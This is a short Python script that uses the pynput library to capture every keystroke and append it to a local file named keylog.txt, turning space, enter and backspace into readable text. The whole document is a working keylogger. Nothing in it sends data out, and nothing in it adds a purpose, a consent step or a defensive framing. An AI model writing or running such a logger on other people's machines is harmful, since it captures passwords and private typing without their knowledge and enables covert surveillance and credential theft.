from pynput.keyboard import Listener

log_file = "keylog.txt"

# Clear the file at the start
with open(log_file, "w") as file:
    file.write("Keylog started...\n")

def on_press(key):
    try:
        key = str(key).replace("'", "")  # Remove quotes around characters

        # Handle special keys
        if key == "Key.space":
            key = " "  # Replace space key with actual space
        elif key == "Key.enter":
            key = "\n"  # Start a new line on Enter key
        elif key == "Key.backspace":
            key = "[BACKSPACE]"  # Show backspace in logs

        # Append the key press to the log file
        with open(log_file, "a") as file:
            file.write(key)

    except Exception as e:
        print(f"Error: {e}")

# Start listening for key presses
with Listener(on_press=on_press) as listener:
    listener.join()
